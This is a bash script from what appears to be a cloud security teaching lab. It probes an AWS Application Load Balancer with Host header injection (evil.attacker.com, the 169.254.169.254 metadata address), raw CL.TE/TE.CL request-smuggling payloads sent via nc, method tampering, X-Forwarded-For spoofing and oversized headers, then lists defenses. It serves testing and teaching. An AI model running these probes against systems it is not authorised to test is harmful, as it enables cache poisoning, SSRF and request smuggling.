#!/usr/bin/env bash
# =============================================================================
# 12_alb_attacks.sh — ALB-Specific Attack Vector Tests
# =============================================================================
# Purpose:
#   Test attack vectors targeting the ALB layer, which only exists in
#   Config B (Private Subnet + ALB architecture).
#
# Attack scenarios:
#   1. Host header injection — cache poisoning, password reset hijacking
#   2. HTTP request smuggling — CL.TE / TE.CL probes
#   3. HTTP method tampering — TRACE/PUT/DELETE and other unauthorized methods
#   4. X-Forwarded-For spoofing — IP address forgery
#   5. Oversized header / URL length test — ALB limit verification
#
# Learning points:
#   - Private Subnet architecture introduces ALB as a new attack surface
#   - ALB normalizes and blocks many attacks, but not all
#   - Adding AWS WAF provides additional defense
#
# Prerequisites:
#   - Only executable in Config B (private mode)
#   - Exits early in Config A
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

# ---------------------------------------------------------------------------
# Exit early if Config A
# ---------------------------------------------------------------------------
if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "${YELLOW}[SKIP] ALB attacks require Config B (private mode)${NC}"
    echo -e "${YELLOW}       Config A does not use ALB — these tests are not applicable.${NC}"
    exit 0
fi

print_header "12: ALB Attack Vectors (ALB-Specific Attack Tests)"

RESULT_FILE="12_alb_attacks.txt"
result_text=""

# Extract ALB hostname (strip http://)
ALB_HOST="${ATTACK_TARGET#http://}"
ALB_HOST="${ALB_HOST#https://}"
ALB_HOST="${ALB_HOST%%/*}"

echo -e "${BLUE}[*] Target: http://${ALB_HOST}${NC}"
echo -e "${BLUE}[*] ALB Host: ${ALB_HOST}${NC}"
echo ""

# Vulnerability counters
vuln_count=0
blocked_count=0
info_count=0

# ---------------------------------------------------------------------------
# Step 1: Host header injection
# ---------------------------------------------------------------------------
# Spoof the Host header and observe ALB behavior.
# Can be exploited for cache poisoning, password reset hijacking, SSRF, etc.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 1: Host Header Injection${NC}"
echo ""

result_text+="=== Step 1: Host Header Injection ==="$'\n'

declare -a HOST_INJECTIONS=(
    "evil.attacker.com"
    "169.254.169.254"
    "internal.corp.local"
)

# Test against root path
for injected_host in "${HOST_INJECTIONS[@]}"; do
    echo -e "  Testing Host: ${injected_host} on /"
    response=$(curl -sS -m 5 -H "Host: ${injected_host}" "http://${ALB_HOST}/" 2>&1) || response=""
    response_snippet="${response:0:300}"

    result_text+="Host: ${injected_host} -> / : ${response_snippet}"$'\n'

    if echo "${response}" | grep -qi "${injected_host}"; then
        print_vulnerable "Response reflects injected Host header: ${injected_host}"
        result_text+="  Verdict: VULNERABLE — Host reflected in response"$'\n'
        ((vuln_count++)) || true
    else
        print_blocked "Injected Host '${injected_host}' not reflected in response"
        result_text+="  Verdict: BLOCKED — Host not reflected"$'\n'
        ((blocked_count++)) || true
    fi
done

# Test against /info endpoint
echo ""
echo -e "  Testing Host: evil.attacker.com on /info"
info_response=$(curl -sS -m 5 -H "Host: evil.attacker.com" "http://${ALB_HOST}/info" 2>&1) || info_response=""
info_snippet="${info_response:0:300}"

result_text+="Host: evil.attacker.com -> /info : ${info_snippet}"$'\n'

if echo "${info_response}" | grep -qi "evil.attacker.com"; then
    print_vulnerable "Host header reflected in /info response"
    result_text+="  Verdict: VULNERABLE — Host reflected in /info"$'\n'
    ((vuln_count++)) || true
else
    print_blocked "Host header not reflected in /info response"
    result_text+="  Verdict: BLOCKED — Host not reflected in /info"$'\n'
    ((blocked_count++)) || true
fi

# Record response headers
echo ""
echo -e "  Recording response headers for Host injection..."
inject_headers=$(curl -sS -I -m 5 -H "Host: evil.attacker.com" "http://${ALB_HOST}/" 2>&1) || inject_headers=""
result_text+=$'\n'"Response headers (Host: evil.attacker.com):"$'\n'
result_text+="${inject_headers}"$'\n'

print_info "Host header injection can lead to: cache poisoning, password reset hijacking, SSRF via host header"
result_text+="Educational: Host header injection -> cache poisoning, password reset hijacking, SSRF"$'\n'$'\n'

echo ""

# ---------------------------------------------------------------------------
# Step 2: HTTP Request Smuggling Probe
# ---------------------------------------------------------------------------
# Send both Content-Length and Transfer-Encoding headers to detect
# interpretation discrepancies between ALB and the backend.
# AWS ALB generally normalizes these, so BLOCKED is expected.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 2: HTTP Request Smuggling Probe${NC}"
echo ""

result_text+="=== Step 2: HTTP Request Smuggling Probe ==="$'\n'

# nc command timeout option (macOS vs Linux)
if [[ "$(uname)" == "Darwin" ]]; then
    nc_timeout="-G 5"
else
    nc_timeout=""
fi

# CL.TE test: Send both Content-Length and Transfer-Encoding simultaneously
echo -e "  CL.TE probe: Sending conflicting Content-Length and Transfer-Encoding..."
clte_response=$(printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG' "${ALB_HOST}" | nc -w 5 ${nc_timeout} "${ALB_HOST}" 80 2>&1) || clte_response="Connection failed or timeout"
clte_snippet="${clte_response:0:500}"

echo "  CL.TE response: ${clte_snippet:0:200}"
result_text+="CL.TE probe response: ${clte_snippet}"$'\n'

# TE.CL test
echo ""
echo -e "  TE.CL probe: Sending reversed conflicting headers..."
tecl_response=$(printf 'POST / HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n1\r\nA\r\n0\r\n\r\n' "${ALB_HOST}" | nc -w 5 ${nc_timeout} "${ALB_HOST}" 80 2>&1) || tecl_response="Connection failed or timeout"
tecl_snippet="${tecl_response:0:500}"

echo "  TE.CL response: ${tecl_snippet:0:200}"
result_text+="TE.CL probe response: ${tecl_snippet}"$'\n'

# Evaluate results
smuggling_detected=false

for smuggle_resp in "${clte_response}" "${tecl_response}"; do
    # Detect response splitting or unexpected status codes
    if echo "${smuggle_resp}" | grep -qiE "HTTP/1\.[01] [0-9]{3}.*HTTP/1\.[01] [0-9]{3}"; then
        smuggling_detected=true
    fi
done

if [[ "${smuggling_detected}" == "true" ]]; then
    print_vulnerable "Request smuggling indicators detected — Response splitting observed"
    result_text+="Verdict: VULNERABLE — Response splitting indicators detected"$'\n'
    ((vuln_count++)) || true
else
    print_blocked "No request smuggling indicators — ALB correctly normalizes requests"
    result_text+="Verdict: BLOCKED — ALB normalizes conflicting headers"$'\n'
    ((blocked_count++)) || true
fi

print_info "AWS ALBs are generally hardened against request smuggling attacks"
result_text+="Educational: AWS ALBs normalize Content-Length/Transfer-Encoding conflicts"$'\n'$'\n'

echo ""

# ---------------------------------------------------------------------------
# Step 3: HTTP Method Tampering
# ---------------------------------------------------------------------------
# Test whether non-standard HTTP methods pass through ALB.
# TRACE returning 200 enables XST (Cross-Site Tracing) attacks.
# PUT/DELETE returning 200 enables unauthorized data manipulation.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 3: HTTP Method Tampering${NC}"
echo ""

result_text+="=== Step 3: HTTP Method Tampering ==="$'\n'

declare -a TEST_METHODS=("TRACE" "OPTIONS" "PUT" "DELETE" "PATCH" "PROPFIND")

for method in "${TEST_METHODS[@]}"; do
    status_code=$(curl -sS -o /dev/null -w "%{http_code}" -m 5 -X "${method}" "http://${ALB_HOST}/" 2>/dev/null) || status_code="000"

    echo -e "  ${method}: HTTP ${status_code}"
    result_text+="${method}: HTTP ${status_code}"$'\n'

    case "${method}" in
        TRACE)
            if [[ "${status_code}" == "200" ]]; then
                # If TRACE returns 200, check whether the request is echoed in the response body
                trace_body=$(curl -sS -m 5 -X TRACE "http://${ALB_HOST}/" 2>/dev/null) || trace_body=""
                if echo "${trace_body}" | grep -qi "TRACE / HTTP"; then
                    print_vulnerable "TRACE method returns 200 with echoed request — XST attack possible"
                    result_text+="  TRACE Verdict: VULNERABLE — XST possible"$'\n'
                    ((vuln_count++)) || true
                else
                    print_info "TRACE returns 200 but does not echo request"
                    result_text+="  TRACE Verdict: INFO — 200 but no echo"$'\n'
                    ((info_count++)) || true
                fi
            else
                print_blocked "TRACE method blocked or not supported (HTTP ${status_code})"
                result_text+="  TRACE Verdict: BLOCKED"$'\n'
                ((blocked_count++)) || true
            fi
            ;;
        OPTIONS)
            print_info "OPTIONS method returned HTTP ${status_code} (standard CORS preflight)"
            result_text+="  OPTIONS Verdict: INFO — Standard CORS"$'\n'
            ((info_count++)) || true
            ;;
        PUT|DELETE)
            if [[ "${status_code}" == "200" ]]; then
                print_vulnerable "${method} method returns 200 — Should be restricted"
                result_text+="  ${method} Verdict: VULNERABLE — Should be restricted"$'\n'
                ((vuln_count++)) || true
            else
                print_blocked "${method} method properly restricted (HTTP ${status_code})"
                result_text+="  ${method} Verdict: BLOCKED"$'\n'
                ((blocked_count++)) || true
            fi
            ;;
        *)
            if [[ "${status_code}" == "200" ]]; then
                print_info "${method} method accepted (HTTP ${status_code})"
                result_text+="  ${method} Verdict: INFO"$'\n'
                ((info_count++)) || true
            else
                print_blocked "${method} method rejected (HTTP ${status_code})"
                result_text+="  ${method} Verdict: BLOCKED"$'\n'
                ((blocked_count++)) || true
            fi
            ;;
    esac
done

echo ""

# ---------------------------------------------------------------------------
# Step 4: X-Forwarded-For Spoofing (IP address forgery)
# ---------------------------------------------------------------------------
# ALB appends the connecting client IP to the X-Forwarded-For header but
# does not remove existing XFF headers. If the backend trusts the leftmost
# value, IP address spoofing succeeds.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 4: X-Forwarded-For Spoofing (IP Address Forgery)${NC}"
echo ""

result_text+="=== Step 4: X-Forwarded-For Spoofing ==="$'\n'

# Baseline: normal request without XFF header
echo -e "  Baseline: Normal request without X-Forwarded-For"
baseline_response=$(curl -sS -m 5 "http://${ALB_HOST}/info" 2>&1) || baseline_response=""
baseline_snippet="${baseline_response:0:300}"
echo "  Baseline response: ${baseline_snippet:0:200}"
result_text+="Baseline (no XFF): ${baseline_snippet}"$'\n'$'\n'

declare -A XFF_TESTS=(
    ["127.0.0.1"]="localhost spoofing"
    ["10.0.0.1"]="internal IP spoofing"
    ["8.8.8.8"]="Google DNS spoofing"
)

xff_vuln=false

for xff_ip in "${!XFF_TESTS[@]}"; do
    desc="${XFF_TESTS[${xff_ip}]}"
    echo ""
    echo -e "  Testing X-Forwarded-For: ${xff_ip} (${desc})"

    xff_response=$(curl -sS -m 5 -H "X-Forwarded-For: ${xff_ip}" "http://${ALB_HOST}/info" 2>&1) || xff_response=""
    xff_snippet="${xff_response:0:300}"

    echo "  Response: ${xff_snippet:0:200}"
    result_text+="XFF: ${xff_ip} (${desc}) -> ${xff_snippet}"$'\n'

    # Check if the backend trusts the spoofed XFF
    # Vulnerable if the response contains the spoofed IP and differs from baseline
    if echo "${xff_response}" | grep -q "${xff_ip}"; then
        if [[ "${xff_response}" != "${baseline_response}" ]]; then
            print_vulnerable "Backend trusts spoofed X-Forwarded-For: ${xff_ip}"
            result_text+="  Verdict: VULNERABLE — Backend trusts spoofed XFF"$'\n'
            xff_vuln=true
            ((vuln_count++)) || true
        else
            print_info "XFF value ${xff_ip} appears in response but behavior unchanged"
            result_text+="  Verdict: INFO — XFF present but behavior unchanged"$'\n'
            ((info_count++)) || true
        fi
    else
        print_blocked "Spoofed XFF ${xff_ip} not reflected in backend response"
        result_text+="  Verdict: BLOCKED — XFF not reflected"$'\n'
        ((blocked_count++)) || true
    fi
done

echo ""
print_info "ALB appends client IP to X-Forwarded-For but does not remove existing values"
print_info "Backend must use rightmost (ALB-added) value, not leftmost (attacker-supplied)"
result_text+="Educational: ALB appends to XFF, does not strip existing. Backend must use rightmost value."$'\n'$'\n'

echo ""

# ---------------------------------------------------------------------------
# Step 5: Oversized Header / URL Length Test
# ---------------------------------------------------------------------------
# Verify ALB header size limits (~16KB) and URL length limits.
# Goal is to raise security awareness and understand ALB protection features.
# ---------------------------------------------------------------------------
echo -e "${BLUE}[*] Step 5: Oversized Header / URL Length Test${NC}"
echo ""

result_text+="=== Step 5: Oversized Header / URL Length Test ==="$'\n'

# 8KB header test
echo -e "  Testing 8KB header..."
header_8k=$(python3 -c 'print("A"*8000)')
status_8k=$(curl -sS -o /dev/null -w "%{http_code}" -m 10 -H "X-Test: ${header_8k}" "http://${ALB_HOST}/" 2>/dev/null) || status_8k="000"
echo -e "  8KB header: HTTP ${status_8k}"
result_text+="8KB header: HTTP ${status_8k}"$'\n'

# 16KB header test
echo -e "  Testing 16KB header..."
header_16k=$(python3 -c 'print("A"*16000)')
status_16k=$(curl -sS -o /dev/null -w "%{http_code}" -m 10 -H "X-Test: ${header_16k}" "http://${ALB_HOST}/" 2>/dev/null) || status_16k="000"
echo -e "  16KB header: HTTP ${status_16k}"
result_text+="16KB header: HTTP ${status_16k}"$'\n'

# Long URL test
echo -e "  Testing 8KB URL path..."
long_path=$(python3 -c 'print("A"*8000)')
status_long_url=$(curl -sS -o /dev/null -w "%{http_code}" -m 10 "http://${ALB_HOST}/${long_path}" 2>/dev/null) || status_long_url="000"
echo -e "  8KB URL: HTTP ${status_long_url}"
result_text+="8KB URL path: HTTP ${status_long_url}"$'\n'

echo ""

# Analyze results
for label_status in "8KB header:${status_8k}" "16KB header:${status_16k}" "8KB URL:${status_long_url}"; do
    label="${label_status%%:*}"
    status="${label_status##*:}"
    case "${status}" in
        200)
            print_info "${label}: Passed through ALB (HTTP 200)"
            result_text+="${label}: Passed through"$'\n'
            ((info_count++)) || true
            ;;
        431|494)
            print_blocked "${label}: ALB rejected — Header too large (HTTP ${status})"
            result_text+="${label}: Rejected by ALB (HTTP ${status})"$'\n'
            ((blocked_count++)) || true
            ;;
        414)
            print_blocked "${label}: ALB rejected — URI too long (HTTP ${status})"
            result_text+="${label}: Rejected by ALB (HTTP ${status})"$'\n'
            ((blocked_count++)) || true
            ;;
        460|502|503)
            print_info "${label}: ALB connection issue (HTTP ${status})"
            result_text+="${label}: ALB issue (HTTP ${status})"$'\n'
            ((info_count++)) || true
            ;;
        000)
            print_info "${label}: Connection failed or timeout"
            result_text+="${label}: Connection failed"$'\n'
            ((info_count++)) || true
            ;;
        *)
            print_info "${label}: HTTP ${status}"
            result_text+="${label}: HTTP ${status}"$'\n'
            ((info_count++)) || true
            ;;
    esac
done

print_info "ALB limits: approximately 16KB total header size per request"
result_text+="Educational: ALB header size limit is approximately 16KB"$'\n'$'\n'

echo ""

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  ALB Attack Vector Summary (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  ${RED}VULNERABLE:${NC} ${vuln_count}"
echo -e "  ${GREEN}BLOCKED:${NC}    ${blocked_count}"
echo -e "  ${BLUE}INFO:${NC}       ${info_count}"
echo ""

result_text+="=== Summary ==="$'\n'
result_text+="VULNERABLE: ${vuln_count}"$'\n'
result_text+="BLOCKED: ${blocked_count}"$'\n'
result_text+="INFO: ${info_count}"$'\n'$'\n'

echo -e "${BOLD}  These attacks target the ALB layer which only exists in Config B.${NC}"
echo -e "${BOLD}  Private Subnet introduces ALB as a new attack surface.${NC}"
echo ""

result_text+="These attacks target the ALB layer which only exists in Config B."$'\n'
result_text+="Private Subnet introduces ALB as a new attack surface."$'\n'$'\n'

echo -e "${BOLD}  Recommended defenses:${NC}"
echo -e "    1. AWS WAF — Rule-based request filtering"
echo -e "    2. Host-based routing rules — Accept only permitted hostnames"
echo -e "    3. Header normalization — Leverage ALB header normalization features"
echo -e "    4. HTTPS-only — Disable HTTP entirely with TLS termination"
echo ""

result_text+="Recommended defenses:"$'\n'
result_text+="  1. AWS WAF — Rule-based request filtering"$'\n'
result_text+="  2. Host-based routing rules — Accept only permitted hostnames"$'\n'
result_text+="  3. Header normalization — Leverage ALB header normalization"$'\n'
result_text+="  4. HTTPS-only — Disable HTTP entirely with TLS termination"$'\n'

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "ALB attack vector test complete"
